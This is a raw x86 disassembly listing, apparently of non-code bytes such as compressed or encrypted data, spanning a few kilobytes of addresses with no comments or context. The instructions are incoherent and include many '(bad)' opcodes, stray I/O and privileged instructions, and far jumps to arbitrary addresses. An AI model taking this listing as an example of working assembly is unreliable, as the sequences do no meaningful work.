  41dfbe:	inc    DWORD PTR [ebx+ebp*1+0x1]
  41dfc2:	sbb    al,0xa9
  41dfc4:	aaa    
  41dfc5:	push   edi
  41dfc6:	xor    ebx,DWORD PTR gs:[edi-0x5bba9342]
  41dfcd:	adc    esi,DWORD PTR [eax+0x2]
  41dfd0:	pop    ebp
  41dfd1:	ss adc eax,0xafd80f90
  41dfd7:	sbb    al,al
  41dfd9:	pop    edi
  41dfda:	scas   al,BYTE PTR es:[edi]
  41dfdb:	mov    cl,0x5a
  41dfdd:	ret    
  41dfde:	frstor [esi]
  41dfe0:	hlt    
  41dfe1:	mov    esp,esi
  41dfe3:	xchg   ebx,eax
  41dfe4:	ret    
  41dfe5:	jno    0x41e00b
  41dfe7:	push   esi
  41dfe8:	mov    cl,0xec
  41dfea:	xor    cl,BYTE PTR [esi+0x3e]
  41dfed:	jecxz  0x41df88
  41dfef:	cmp    bl,cl
  41dff1:	push   ss
  41dff2:	mov    esi,0x2791c85a
  41dff7:	jmp    0x9ee5:0x3f888459
  41dffe:	xchg   ebx,eax
  41dfff:	pop    ecx
  41e000:	cli    
  41e001:	scas   eax,DWORD PTR es:[edi]
  41e002:	mov    esp,DWORD PTR [esi]
  41e004:	inc    ebx
  41e005:	call   0x70aed4a3
  41e00a:	(bad)  
  41e00b:	or     DWORD PTR [edx+eiz*1+0x4a1efed2],edx
  41e012:	daa    
  41e013:	or     ebp,DWORD PTR cs:[esi]
  41e016:	cmp    ebp,DWORD PTR ds:0x20273e4b
  41e01c:	xor    DWORD PTR [ecx+ebp*2-0x51a70813],eax
  41e023:	ja     0x41dfd2
  41e025:	out    dx,eax
  41e026:	push   esi
  41e027:	cld    
  41e028:	push   0x42cf89ae
  41e02d:	pop    edx
  41e02e:	scas   eax,DWORD PTR es:[edi]
  41e02f:	xor    DWORD PTR [esi+0x58],ebp
  41e032:	fmul   QWORD PTR [ecx-0x45]
  41e035:	clc    
  41e036:	cmp    DWORD PTR [ecx],esp
  41e038:	xor    bh,bh
  41e03a:	and    al,0x47
  41e03c:	and    BYTE PTR ds:[edi+0x55],al
  41e040:	xor    DWORD PTR [edi],ebx
  41e042:	push   esp
  41e043:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e044:	shr    BYTE PTR [ecx+0x7d],0x65
  41e048:	pop    es
  41e049:	sbb    esp,DWORD PTR ds:0x5177f461
  41e04f:	iret   
  41e050:	es (bad) 
  41e052:	(bad)  
  41e053:	push   edi
  41e054:	or     eax,0xeccdb950
  41e059:	in     al,0xc9
  41e05b:	cmc    
  41e05c:	mov    esp,0xcecfaf01
  41e061:	push   cs
  41e062:	push   eax
  41e063:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e064:	push   eax
  41e065:	(bad)  
  41e066:	sbb    edi,DWORD PTR [eax-0x4626dff6]
  41e06c:	out    0x70,eax
  41e06e:	jmp    0x41e062
  41e070:	dec    edi
  41e071:	fdiv   QWORD PTR [eax]
  41e073:	pop    ds
  41e074:	shl    DWORD PTR [esi+0x625a032d],1
  41e07a:	push   edi
  41e07b:	xchg   ecx,eax
  41e07c:	shl    BYTE PTR fs:[eax],cl
  41e07f:	out    0x90,al
  41e081:	sub    DWORD PTR [ecx+esi*4-0x6a185b91],eax
  41e088:	mov    DWORD PTR [ecx-0x73],edx
  41e08b:	mov    cl,0x34
  41e08d:	and    esp,ebp
  41e08f:	bound  edx,QWORD PTR [edi+0x70]
  41e092:	xor    ecx,esp
  41e094:	sbb    DWORD PTR [ecx+edi*8-0x28add52a],0x927f2fc9
  41e09f:	sahf   
  41e0a0:	retf   0x2318
  41e0a3:	jle    0x41e10d
  41e0a5:	fstp   QWORD PTR [ebx+0x3d4ff617]
  41e0ab:	pop    esp
  41e0ac:	fadd   st(3),st
  41e0ae:	shl    ah,1
  41e0b0:	loop   0x41e11c
  41e0b2:	or     DWORD PTR [esi],0xfffffff9
  41e0b5:	and    ecx,DWORD PTR [edx]
  41e0b7:	mov    ch,0x92
  41e0b9:	push   eax
  41e0ba:	and    eax,0xa90a7be9
  41e0bf:	adc    cl,dh
  41e0c1:	jno    0x41e13c
  41e0c3:	mov    cl,0x56
  41e0c5:	aaa    
  41e0c6:	js     0x41e122
  41e0c8:	xchg   ecx,eax
  41e0c9:	mov    dl,0x3
  41e0cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e0cc:	test   DWORD PTR [eax+0x522c720a],edx
  41e0d2:	pusha  
  41e0d3:	(bad)  
  41e0d4:	inc    edi
  41e0d5:	pop    ebx
  41e0d6:	retf   
  41e0d7:	adc    eax,0x553e02a7
  41e0dc:	dec    ecx
  41e0dd:	push   esp
  41e0de:	shl    BYTE PTR [esi-0x6],1
  41e0e1:	xchg   esp,eax
  41e0e2:	js     0x41e091
  41e0e4:	shl    bl,cl
  41e0e6:	mov    esp,0x4b020e31
  41e0eb:	retf   
  41e0ec:	mov    DWORD PTR [ebx],eax
  41e0ee:	ins    BYTE PTR es:[edi],dx
  41e0ef:	repz (bad) 
  41e0f2:	mov    dh,0xab
  41e0f4:	adc    DWORD PTR [ebp-0x4c5afbf2],ecx
  41e0fa:	add    eax,esi
  41e0fc:	jbe    0x41e0fd
  41e0fe:	shl    DWORD PTR [ecx-0x7b],cl
  41e101:	mov    ecx,0x160d4970
  41e106:	sbb    DWORD PTR ds:0x994e200a,ecx
  41e10c:	push   ecx
  41e10d:	das    
  41e10e:	jo     0x41e125
  41e110:	mov    ebp,0x9a66a80a
  41e115:	dec    esp
  41e116:	or     DWORD PTR fs:[esi],edi
  41e119:	mov    ah,0xff
  41e11b:	pop    edi
  41e11c:	cmp    DWORD PTR [ecx+0x39],ebx
  41e11f:	sub    ecx,DWORD PTR ds:0xcbcbee90
  41e125:	addr16 mov bh,0x86
  41e128:	out    0x43,eax
  41e12a:	and    BYTE PTR [esi+eax*1-0x3b0b91da],dh
  41e131:	inc    ebx
  41e132:	je     0x41e113
  41e134:	aam    0x16
  41e136:	iret   
  41e137:	jmp    0xb8f9:0xd7f02b23
  41e13e:	add    al,bh
  41e140:	ja     0x41e0c6
  41e142:	(bad)  
  41e143:	rcl    BYTE PTR [esp+edx*4],cl
  41e146:	sbb    al,0x39
  41e148:	retf   
  41e149:	dec    ebp
  41e14a:	lds    eax,FWORD PTR [ecx-0x2905402c]
  41e150:	adc    DWORD PTR [eax],ecx
  41e152:	nop
  41e153:	shl    DWORD PTR [eax+0x408aba67],0x9a
  41e15a:	shl    DWORD PTR [edx],1
  41e15c:	into   
  41e15d:	sbb    al,0x36
  41e15f:	out    dx,al
  41e160:	lods   eax,DWORD PTR ds:[esi]
  41e161:	xchg   esi,eax
  41e162:	or     al,0x5c
  41e164:	mov    ?,edi
  41e166:	mov    dh,0xe0
  41e168:	ins    BYTE PTR es:[edi],dx
  41e169:	sbb    ah,BYTE PTR [edi]
  41e16b:	daa    
  41e16c:	dec    esi
  41e16d:	dec    esp
  41e16e:	mov    al,ds:0xf0557dee
  41e173:	mov    ah,BYTE PTR [eax-0x598d9f7d]
  41e179:	lock xchg edi,eax
  41e17b:	inc    ecx
  41e17c:	out    0xd,eax
  41e17e:	test   BYTE PTR fs:[edx-0x1e],dl
  41e182:	stc    
  41e183:	mov    ebp,0x6df78904
  41e188:	in     al,dx
  41e189:	nop
  41e18a:	test   DWORD PTR [ebx+0x3cd7e7f5],edx
  41e190:	fiadd  DWORD PTR [ebp+0x1e]
  41e193:	add    ebx,DWORD PTR [ebp-0x1a]
  41e196:	(bad)  
  41e197:	mov    ah,0xb4
  41e199:	inc    ebx
  41e19a:	push   edi
  41e19b:	mov    ecx,0xae80e167
  41e1a0:	mov    cl,0x80
  41e1a2:	out    dx,eax
  41e1a3:	stos   DWORD PTR es:[edi],eax
  41e1a4:	sbb    BYTE PTR [ecx+0x3dee4be1],0x3c
  41e1ab:	jecxz  0x41e167
  41e1ad:	int3   
  41e1ae:	mov    edx,0x124d5786
  41e1b3:	mov    edi,0x8bd8c201
  41e1b8:	mov    esp,0xd59e734a
  41e1bd:	out    dx,eax
  41e1be:	dec    edi
  41e1bf:	out    dx,al
  41e1c0:	jmp    FWORD PTR [ebx]
  41e1c2:	xchg   DWORD PTR [ecx+ecx*4-0x3a],eax
  41e1c6:	inc    ecx
  41e1c7:	jae    0x41e225
  41e1c9:	stc    
  41e1ca:	adc    dl,ah
  41e1cc:	pop    ecx
  41e1cd:	test   eax,0x5ebaccd2
  41e1d2:	add    ecx,DWORD PTR [esi-0x5c73fa50]
  41e1d8:	push   0xd4dabbee
  41e1dd:	hlt    
  41e1de:	xchg   esi,eax
  41e1df:	js     0x41e1b0
  41e1e1:	lock xor BYTE PTR ds:[eax-0x9],ch
  41e1e6:	mov    ecx,0xdd97fb91
  41e1eb:	lahf   
  41e1ec:	rcr    DWORD PTR [ecx-0x50],0x16
  41e1f0:	test   DWORD PTR [eax],0x45c618d6
  41e1f6:	aas    
  41e1f7:	in     al,0x31
  41e1f9:	sub    al,0x60
  41e1fb:	popf   
  41e1fc:	push   edx
  41e1fd:	and    dl,cl
  41e1ff:	and    BYTE PTR [si-0x3e31],al
  41e204:	jecxz  0x41e27e
  41e206:	cli    
  41e207:	jcxz   0x41e1f2
  41e20a:	mov    dl,ch
  41e20c:	inc    ebx
  41e20d:	je     0x41e1fc
  41e20f:	out    0xd9,eax
  41e211:	sbb    BYTE PTR [ecx+0x6450813f],cl
  41e217:	ja     0x41e25c
  41e219:	jecxz  0x41e224
  41e21b:	cmp    eax,0x581fd01e
  41e220:	or     BYTE PTR [eax+0x12],ch
  41e223:	ins    DWORD PTR es:[edi],dx
  41e224:	mov    ds:0xe39c4254,eax
  41e229:	popf   
  41e22a:	sub    bh,al
  41e22c:	jnp    0x41e205
  41e22e:	xor    al,0x5d
  41e230:	jb     0x41e1c4
  41e232:	lidtd  [edi+0x6aee5202]
  41e239:	mov    edi,0x36c5270d
  41e23e:	out    0x2f,al
  41e240:	push   0xd7e54159
  41e245:	mov    ebp,0x53a678cb
  41e24a:	dec    ebx
  41e24b:	xacquire xchg BYTE PTR [ebx],dl
  41e24e:	or     al,0x34
  41e250:	pop    ebx
  41e251:	popa   
  41e252:	aaa    
  41e253:	mov    BYTE PTR gs:[ebx-0x19823f82],ah
  41e25a:	mov    cl,0x80
  41e25c:	retf   
  41e25d:	out    0x1b,eax
  41e25f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e260:	or     DWORD PTR [eax+ebx*4-0xe9bb222],edx
  41e267:	jge    0x41e235
  41e269:	jnp    0x41e20b
  41e26b:	test   eax,0xa1617fde
  41e270:	adc    al,0x88
  41e272:	pop    edi
  41e273:	mov    esp,0xbd9c86b8
  41e278:	jg     0x41e280
  41e27a:	jle    0x41e253
  41e27c:	xor    BYTE PTR [eax],dl
  41e27e:	and    si,si
  41e281:	out    dx,al
  41e282:	(bad)  [esi+0x5f]
  41e285:	aaa    
  41e286:	sti    
  41e287:	mov    cl,0x3b
  41e289:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e28a:	sbb    eax,0x2b971bb6
  41e28f:	pop    edx
  41e290:	in     al,0x24
  41e292:	inc    ecx
  41e293:	mov    ch,0x31
  41e295:	xchg   esp,eax
  41e296:	out    0x98,eax
  41e298:	mov    ebp,DWORD PTR [esi+0x72e16305]
  41e29e:	jge    0x41e281
  41e2a0:	lahf   
  41e2a1:	clc    
  41e2a2:	and    dh,dl
  41e2a4:	(bad)  
  41e2a5:	bound  esp,QWORD PTR [ecx-0x30]
  41e2a8:	clc    
  41e2a9:	ins    DWORD PTR es:[edi],dx
  41e2aa:	sti    
  41e2ab:	aaa    
  41e2ac:	adc    edx,edx
  41e2ae:	dec    edi
  41e2af:	(bad)  
  41e2b0:	(bad)  
  41e2b1:	xchg   esp,eax
  41e2b2:	pop    ss
  41e2b3:	mov    BYTE PTR [esi+0x29],al
  41e2b6:	xlat   BYTE PTR ss:[ebx]
  41e2b8:	pop    ss
  41e2b9:	pop    edx
  41e2ba:	rcr    BYTE PTR [ecx],1
  41e2bc:	popa   
  41e2bd:	test   DWORD PTR [eax+esi*4+0x76],0xdc832c97
  41e2c5:	repnz mov BYTE PTR [ebx-0x154b163f],0x95
  41e2cd:	pop    ds
  41e2ce:	mov    ch,0x60
  41e2d0:	mov    eax,ds:0xfceb6e51
  41e2d5:	loope  0x41e2e0
  41e2d7:	mov    dh,0x18
  41e2d9:	fidivr DWORD PTR [eax]
  41e2db:	retf   0x22ea
  41e2de:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  41e2e0:	not    BYTE PTR [ecx+0x6b9b2ed1]
  41e2e6:	ret    0xffec
  41e2e9:	pop    es
  41e2ea:	adc    dh,BYTE PTR [ecx+0x62]
  41e2ed:	retf   0x7fd0
  41e2f0:	dec    esi
  41e2f1:	cs fadd st,st(7)
  41e2f4:	lods   eax,DWORD PTR ds:[esi]
  41e2f5:	inc    esp
  41e2f6:	in     al,dx
  41e2f7:	pop    ecx
  41e2f8:	stos   DWORD PTR es:[edi],eax
  41e2f9:	mov    edx,0x1e2cb9d0
  41e2fe:	enter  0xe0d0,0x41
  41e302:	cmp    al,0x22
  41e304:	dec    ebx
  41e305:	mov    bl,0x5
  41e307:	ret    
  41e308:	std    
  41e309:	xor    bh,BYTE PTR [ebx+esi*1+0x2f05bdd1]
  41e310:	adc    al,0xc8
  41e312:	clc    
  41e313:	sti    
  41e314:	adc    eax,0xcaaee3ef
  41e319:	mov    ebx,0xcf2b00f1
  41e31e:	cwde   
  41e31f:	daa    
  41e320:	das    
  41e321:	bound  edx,QWORD PTR [esp+edi*2+0x2]
  41e325:	pusha  
  41e326:	pop    edx
  41e327:	mov    edi,0xcb1b2540
  41e32c:	sbb    al,0x38
  41e32e:	jo     0x41e2c4
  41e330:	xor    dh,bl
  41e332:	bound  ebp,QWORD PTR [esi+0xd008802]
  41e338:	das    
  41e339:	dec    ebp
  41e33a:	ror    DWORD PTR [edi-0x36b35b70],cl
  41e340:	or     DWORD PTR [edi],ebp
  41e342:	cdq    
  41e343:	data16 stos BYTE PTR es:[edi],al
  41e345:	scas   eax,DWORD PTR es:[edi]
  41e346:	(bad)  
  41e347:	xor    al,0x9f
  41e349:	outs   dx,DWORD PTR ds:[esi]
  41e34a:	mov    edi,DWORD PTR [edx-0x4591f56a]
  41e350:	icebp  
  41e351:	dec    ebx
  41e352:	lea    edi,[edi+0x27656e04]
  41e358:	push   ecx
  41e359:	mov    eax,DWORD PTR [edx+0x6b2ef557]
  41e35f:	xchg   ebx,eax
  41e360:	in     al,0xb
  41e362:	mov    ebx,0x6d34c248
  41e367:	mov    fs,WORD PTR [ebp-0x2d]
  41e36a:	ds or  eax,0xb274912e
  41e370:	sub    cl,BYTE PTR [esi]
  41e372:	lods   eax,DWORD PTR ds:[esi]
  41e373:	lds    edx,FWORD PTR [ecx-0x20]
  41e376:	retf   
  41e377:	ds push eax
  41e379:	outs   dx,BYTE PTR ds:[esi]
  41e37a:	aam    0x66
  41e37c:	ud2    
  41e37e:	(bad)  
  41e37f:	stos   BYTE PTR es:[edi],al
  41e380:	mov    ecx,0x5ad6e0f7
  41e385:	adc    bl,bh
  41e387:	jge    0x41e364
  41e389:	into   
  41e38a:	shl    DWORD PTR [ebx],0xc
  41e38d:	jne    0x41e398
  41e38f:	fwait
  41e390:	or     BYTE PTR [edx],bl
  41e392:	call   0x6cd80a95
  41e397:	scas   eax,DWORD PTR es:[edi]
  41e398:	(bad)  
  41e399:	fstp   DWORD PTR [ebp-0x629543ae]
  41e39f:	xchg   ecx,eax
  41e3a0:	jl     0x41e3e0
  41e3a2:	rol    DWORD PTR [esi],1
  41e3a4:	xor    dl,BYTE PTR [edx+ecx*4-0x67]
  41e3a8:	out    dx,al
  41e3a9:	mov    BYTE PTR [ebx+0x63d4f562],al
  41e3af:	mov    DWORD PTR [ebx+eiz*2-0x1fb451de],0xbc42e685
  41e3ba:	fs xchg edi,eax
  41e3bc:	mov    esp,DWORD PTR [eax-0x5dda0c8a]
  41e3c2:	cmp    dh,ch
  41e3c4:	std    
  41e3c5:	out    0x80,al
  41e3c7:	call   0x45fa:0x1dee08c
  41e3ce:	mov    eax,0xca62ee8f
  41e3d3:	test   bl,bl
  41e3d5:	push   ecx
  41e3d6:	bound  ebx,QWORD PTR [eax-0xcfcab2c]
  41e3dc:	sbb    BYTE PTR [esi+edx*4+0x2c],ch
  41e3e0:	pusha  
  41e3e1:	fsub   DWORD PTR [ebx+0x50]
  41e3e4:	rcl    BYTE PTR [esi],cl
  41e3e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e3e7:	arpl   WORD PTR [ebx-0x5f],dx
  41e3ea:	cdq    
  41e3eb:	xchg   DWORD PTR [edi],eax
  41e3ed:	adc    DWORD PTR [ebx],edi
  41e3ef:	hlt    
  41e3f0:	int    0xe3
  41e3f2:	mov    edx,0x80bd8e4
  41e3f7:	lds    esi,FWORD PTR [ebp+0x66b65ba1]
  41e3fd:	xchg   esi,eax
  41e3fe:	xchg   edi,eax
  41e3ff:	hlt    
  41e400:	inc    eax
  41e401:	adc    BYTE PTR [eax],0x7f
  41e404:	(bad)  
  41e405:	push   ss
  41e406:	dec    eax
  41e407:	inc    edi
  41e408:	add    al,0xe4
  41e40a:	test   ecx,eax
  41e40c:	daa    
  41e40d:	imul   esi,DWORD PTR [esi],0x64000b53
  41e413:	xchg   ebx,eax
  41e414:	push   ecx
  41e415:	mov    dh,0x8d
  41e417:	mov    al,ds:0x3c1c9682
  41e41c:	dec    edx
  41e41d:	outs   dx,DWORD PTR ds:[esi]
  41e41e:	push   ebx
  41e41f:	xchg   BYTE PTR [edx+0x56],ah
  41e422:	sbb    eax,0x1e156954
  41e427:	bound  ecx,QWORD PTR [ebp+0x7b]
  41e42a:	ficomp WORD PTR [edi+eax*8+0x4843ed9b]
  41e431:	mov    ss:0x3816ea99,al
  41e437:	xor    al,0x5d
  41e439:	sub    BYTE PTR ds:0x3176c49f,ah
  41e43f:	and    al,0xf0
  41e441:	cmp    esp,DWORD PTR [ebp-0x1f]
  41e444:	icebp  
  41e445:	jge    0x41e457
  41e447:	arpl   WORD PTR [ebx],bp
  41e449:	inc    esp
  41e44a:	cwde   
  41e44b:	(bad)  
  41e44c:	cmp    dl,cl
  41e44e:	aas    
  41e44f:	sub    eax,0x1a17261b
  41e454:	sub    dl,BYTE PTR [edx-0x5fbe4ecd]
  41e45a:	test   eax,0x48c756fc
  41e45f:	xchg   edx,eax
  41e460:	ficom  WORD PTR [eax+ebx*4]
  41e463:	test   DWORD PTR [edx-0x6e],esi
  41e466:	dec    ecx
  41e467:	xlat   BYTE PTR ds:[ebx]
  41e468:	mov    DWORD PTR ds:0x554c5996,edx
  41e46e:	jmp    0x41e435
  41e470:	or     eax,0x6a94b48b
  41e475:	adc    BYTE PTR [ecx-0x48268c41],ah
  41e47b:	mov    es,WORD PTR [ebx+0x5fc2c94c]
  41e481:	xor    al,0x16
  41e483:	adc    al,0x74
  41e485:	mov    edx,0x31effe7c
  41e48a:	into   
  41e48b:	xlat   BYTE PTR ds:[ebx]
  41e48c:	mulps  xmm3,XMMWORD PTR [ebp-0x7e0f6548]
  41e493:	inc    ecx
  41e494:	inc    eax
  41e495:	and    DWORD PTR [eax-0x3f42215f],esi
  41e49b:	aaa    
  41e49c:	mov    ds:0xaa89149a,eax
  41e4a1:	and    DWORD PTR [edx+0x2c],edi
  41e4a4:	int3   
  41e4a5:	es stc 
  41e4a7:	sub    BYTE PTR [eax-0x31da8ce0],al
  41e4ad:	icebp  
  41e4ae:	mov    bl,0x46
  41e4b0:	push   eax
  41e4b1:	(bad)  
  41e4b2:	aam    0x93
  41e4b4:	push   esi
  41e4b5:	cmp    dh,dl
  41e4b7:	inc    ebp
  41e4b8:	fmul   QWORD PTR [eax]
  41e4ba:	jmp    0x1dd2:0xd9d5951d
  41e4c1:	push   cs
  41e4c2:	jbe    0x41e491
  41e4c4:	mov    WORD PTR [ebp-0x6e],es
  41e4c7:	rcl    BYTE PTR [ebx],1
  41e4c9:	fucom  st(5)
  41e4cb:	push   ds
  41e4cc:	inc    ebx
  41e4cd:	mov    eax,0xb91104ee
  41e4d2:	inc    ebp
  41e4d3:	mov    edx,DWORD PTR [esi-0x2f383b6c]
  41e4d9:	js     0x41e4db
  41e4db:	out    0xda,al
  41e4dd:	mov    ebx,0x9d015457
  41e4e2:	xchg   ebx,eax
  41e4e3:	fidivr WORD PTR [ebp+0x10]
  41e4e6:	popa   
  41e4e7:	ins    BYTE PTR es:[edi],dx
  41e4e8:	in     eax,0xc1
  41e4ea:	jg     0x41e477
  41e4ec:	add    ch,BYTE PTR [eax+0x7f8189df]
  41e4f2:	pop    ds
  41e4f3:	push   esi
  41e4f4:	lods   eax,DWORD PTR ds:[esi]
  41e4f5:	mov    DWORD PTR [edi+eax*8],edx
  41e4f8:	cmp    ch,cl
  41e4fa:	mov    DWORD PTR [esi+0x2d95d952],edi
  41e500:	pop    ss
  41e501:	push   0xc9c86589
  41e506:	imul   ecx,DWORD PTR [ecx*4-0x3c63f653],0xd4578050
  41e511:	dec    ebx
  41e512:	outs   dx,BYTE PTR ds:[esi]
  41e513:	(bad)  
  41e514:	mov    ds:0x53e1602a,al
  41e519:	jnp    0x41e49e
  41e51b:	shl    eax,cl
  41e51d:	repnz bound ecx,QWORD PTR gs:[esp+edx*8-0x41]
  41e523:	push   eax
  41e524:	sub    bl,ah
  41e526:	es pop ss
  41e528:	cmp    BYTE PTR [eax+0x2a35e300],bl
  41e52e:	mov    fs,WORD PTR [edx+0x79]
  41e531:	dec    BYTE PTR [ebp+0x72]
  41e534:	fcmovnb st,st(5)
  41e536:	cmp    dh,BYTE PTR [ecx-0x9c69845]
  41e53c:	inc    ebx
  41e53d:	loope  0x41e55b
  41e53f:	jmp    0x6f976170
  41e544:	sahf   
  41e545:	mov    edx,0x25c17b4e
  41e54a:	icebp  
  41e54b:	push   ebx
  41e54c:	mov    esi,0x9e11466e
  41e551:	aaa    
  41e552:	rcl    BYTE PTR [edi],1
  41e554:	inc    BYTE PTR [eax+edi*8+0x71]
  41e558:	nop
  41e559:	mov    bh,0x39
  41e55b:	sbb    eax,0x23755b18
  41e560:	(bad)  
  41e561:	xchg   ebx,eax
  41e562:	gs (bad) 
  41e564:	sub    ecx,DWORD PTR [edi-0x18]
  41e567:	dec    ebp
  41e568:	pop    ss
  41e569:	sbb    DWORD PTR [ebx+ebp*1-0x53a0fc73],ebx
  41e570:	mov    eax,0x9e2e5b4f
  41e575:	aam    0x81
  41e577:	stos   DWORD PTR es:[edi],eax
  41e578:	(bad)  
  41e579:	sahf   
  41e57a:	retf   0xd5d2
  41e57d:	push   edx
  41e57e:	inc    eax
  41e57f:	jns    0x41e566
  41e581:	cmp    al,0xad
  41e583:	rcr    DWORD PTR [esp+edx*4],cl
  41e586:	cmp    al,0xff
  41e588:	add    al,0xbf
  41e58a:	stos   DWORD PTR es:[edi],eax
  41e58b:	loope  0x41e553
  41e58d:	jno    0x41e5f0
  41e58f:	scas   al,BYTE PTR es:[edi]
  41e590:	mov    edx,0xaddc4013
  41e595:	mov    esi,0x89fd436e
  41e59a:	jle    0x41e546
  41e59c:	pushf  
  41e59d:	pop    es
  41e59e:	xchg   ebp,eax
  41e59f:	in     al,0xff
  41e5a1:	cld    
  41e5a2:	bound  eax,QWORD PTR [esi]
  41e5a4:	loope  0x41e5c5
  41e5a6:	push   es
  41e5a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e5a8:	cmp    eax,0xccece77
  41e5ad:	test   al,0x6f
  41e5af:	into   
  41e5b0:	or     al,BYTE PTR [edi+esi*8+0x78]
  41e5b4:	enter  0x7bf1,0x49
  41e5b8:	cmp    eax,0xfb6842d2
  41e5bd:	fwait
  41e5be:	and    bl,bh
  41e5c0:	jecxz  0x41e56a
  41e5c2:	fucom  st(6)
  41e5c4:	and    DWORD PTR [edx+esi*4+0x527ff7ab],0x42
  41e5cc:	popa   
  41e5cd:	pop    eax
  41e5ce:	int3   
  41e5cf:	pop    ebp
  41e5d0:	outs   dx,BYTE PTR ds:[esi]
  41e5d1:	xchg   ebp,eax
  41e5d2:	adc    eax,0xef5f7362
  41e5d7:	mov    al,bl
  41e5d9:	shl    DWORD PTR [eax-0x219192d0],cl
  41e5df:	jne    0x41e65e
  41e5e1:	scas   al,BYTE PTR es:[edi]
  41e5e2:	(bad)  
  41e5e3:	test   esp,0x81f3ae51
  41e5e9:	cs xchg ebp,eax
  41e5eb:	outs   dx,DWORD PTR ds:[esi]
  41e5ec:	pusha  
  41e5ed:	sahf   
  41e5ee:	mov    ch,0x9b
  41e5f0:	inc    ecx
  41e5f1:	dec    edi
  41e5f2:	sub    eax,0xcbc7d96e
  41e5f7:	adc    edi,ebx
  41e5f9:	idiv   al
  41e5fb:	dec    ecx
  41e5fc:	loope  0x41e612
  41e5fe:	or     bh,ch
  41e600:	in     al,0x6f
  41e602:	in     al,0xa1
  41e604:	rcl    ebx,cl
  41e606:	pushf  
  41e607:	cmp    bl,BYTE PTR [edi-0x54]
  41e60a:	jbe    0x41e618
  41e60c:	aam    0x71
  41e60e:	test   DWORD PTR [ebp+0x5f],eax
  41e611:	pop    eax
  41e612:	lods   eax,DWORD PTR ds:[esi]
  41e613:	inc    edx
  41e614:	xchg   ecx,eax
  41e615:	repz clc 
  41e617:	sahf   
  41e618:	(bad)  [ecx-0x5b2f766c]
  41e61e:	add    ah,BYTE PTR ds:0xe022fa61
  41e624:	enter  0xb705,0x5b
  41e628:	pop    eax
  41e629:	or     al,0xb7
  41e62b:	xchg   bl,bl
  41e62d:	adc    edx,ecx
  41e62f:	and    BYTE PTR [edx-0x2607b12e],ah
  41e635:	sbb    eax,0x1605a032
  41e63a:	fisttp WORD PTR ds:0x9a43c658
  41e640:	retf   0x3c23
  41e643:	add    al,BYTE PTR ds:0x6ccd3455
  41e649:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  41e64b:	jecxz  0x41e6b3
  41e64d:	push   edi
  41e64e:	xchg   esi,eax
  41e64f:	sub    BYTE PTR [ebx-0x71425d07],0xd2
  41e656:	add    BYTE PTR [ecx+eax*2-0x43],0x8b
  41e65b:	out    0x87,al
  41e65d:	sbb    al,0xba
  41e65f:	div    ch
  41e661:	(bad)  
  41e662:	sub    eax,0xc83c16e5
  41e667:	aam    0x62
  41e669:	cld    
  41e66a:	jmp    0x6cdc75f1
  41e66f:	cmp    eax,0x7ab72046
  41e674:	push   ecx
  41e675:	pop    esi
  41e676:	enter  0x1ffd,0x32
  41e67a:	and    eax,0xf767708c
  41e67f:	sbb    BYTE PTR [ecx-0x4a],dh
  41e682:	dec    esi
  41e683:	sub    ebx,0x1fe29b55
  41e689:	pop    ecx
  41e68a:	repnz mov ecx,DWORD PTR [eax-0x47]
  41e68e:	jne    0x41e70d
  41e690:	xchg   esi,eax
  41e691:	mov    ch,0xcd
  41e693:	popf   
  41e694:	call   FWORD PTR ds:0xb473e04
  41e69a:	fwait
  41e69b:	scas   al,BYTE PTR es:[edi]
  41e69c:	mov    dh,0xfc
  41e69e:	xor    ecx,DWORD PTR [ecx+edx*1-0x31]
  41e6a2:	popa   
  41e6a3:	retf   
  41e6a4:	inc    eax
  41e6a5:	xor    al,ch
  41e6a7:	dec    edi
  41e6a8:	cli    
  41e6a9:	ret    0xded6
  41e6ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e6ad:	pop    edx
  41e6ae:	xchg   esi,eax
  41e6af:	popa   
  41e6b0:	int3   
  41e6b1:	xor    al,0x0
  41e6b3:	sub    eax,0x854bda85
  41e6b8:	jp     0x41e720
  41e6ba:	idiv   BYTE PTR [ecx+ebx*2+0x55]
  41e6be:	jmp    0x41e6d2
  41e6c0:	popf   
  41e6c1:	das    
  41e6c2:	mov    gs,WORD PTR ss:[edi-0x3a903e23]
  41e6c9:	fidivr DWORD PTR [edi+ebp*1-0x7dd3e5b9]
  41e6d0:	jmp    0x71f86cb
  41e6d5:	sub    ebp,edx
  41e6d7:	push   edi
  41e6d8:	xor    al,0x91
  41e6da:	fsub   DWORD PTR [esi+0x5d515e20]
  41e6e0:	mov    eax,ds:0x36d24be
  41e6e5:	mov    cs,WORD PTR [ebx-0x7]
  41e6e8:	das    
  41e6e9:	push   0x28
  41e6eb:	ret    
  41e6ec:	js     0x41e6af
  41e6ee:	and    dh,BYTE PTR [eax]
  41e6f0:	cmp    eax,0xe4a0c50b
  41e6f5:	outs   dx,BYTE PTR ds:[esi]
  41e6f6:	outs   dx,DWORD PTR ds:[esi]
  41e6f7:	dec    esp
  41e6f8:	cs into 
  41e6fa:	pop    esi
  41e6fb:	(bad)  
  41e6fc:	dec    ebp
  41e6fd:	xchg   ebx,eax
  41e6fe:	hlt    
  41e6ff:	xchg   BYTE PTR [eax-0x67],dl
  41e702:	scas   eax,DWORD PTR es:[edi]
  41e703:	repz push ebp
  41e705:	xchg   ecx,edi
  41e707:	adc    DWORD PTR [edi+0x6cf89d3b],eax
  41e70d:	cmp    bl,0x2e
  41e710:	sbb    al,0x98
  41e712:	js     0x41e6bf
  41e714:	popa   
  41e715:	clc    
  41e716:	mov    esp,0x5f98db7b
  41e71b:	imul   edi,DWORD PTR [esi+edx*2-0x74],0xffffffd1
  41e720:	mov    bh,cl
  41e722:	push   es
  41e723:	jnp    0x41e75d
  41e725:	loope  0x41e723
  41e727:	xor    eax,0x30f451fb
  41e72c:	and    eax,0x4dd3c7e7
  41e731:	pop    ecx
  41e732:	jecxz  0x41e6e3
  41e734:	cmc    
  41e735:	popf   
  41e736:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
